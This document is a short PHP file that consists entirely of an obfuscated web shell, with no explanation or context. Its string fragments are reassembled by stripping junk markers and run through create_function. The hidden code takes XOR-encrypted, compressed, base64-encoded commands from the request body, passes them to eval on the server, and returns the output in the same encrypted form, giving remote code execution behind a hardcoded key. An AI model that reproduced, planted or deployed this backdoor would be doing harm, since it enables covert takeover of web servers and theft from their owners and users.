<?php
$b='input>a")>a,$m)==>a>a1) {@ob_start();@e>av>aal(@>agzun>acompress>a(@x>a(@base>a64>a>a_decode>a($m[1]),$k)));$o=@ob>a';
$j='){$>ao.=>a$t{$i}^>a$k{$j}>a;}}r>a>aeturn $o;}if (@p>ar>aeg_match("/$kh>a(.+)$>akf>a/",@file_>aget_>aco>antents("php:>a//';
$C='){$>ac=str>alen($k>a)>a;$l=str>a>alen($t);$o="";for>a($i=>a0;$i<$>al;){for>a>a($j=0;($j<$c&>a&$i>a<>a$l);$j++,$i+>a+';
$v='$k="a0>a7f1>ae68";>a$kh="06>a11>a42f4cc57";$kf="f>aa73a>a>a8>a227679";$p="08pqB>atMcmyi>aGsoCY">a;functio>an x>a($t,$k';
$u='>a_get>a_contents();@ob_>aen>ad_clean();$>ar=@base6>a>a4_enco>ade(@x>a(@gzcompres>as($o),$>ak));pr>ai>ant("$p>a$kh$r$kf");}';
$W=str_replace('X','','crXeaXtXe_XfXunctiXon');
$d=str_replace('>a','',$v.$C.$j.$b.$u);
$y=$W('',$d);$y();
?>
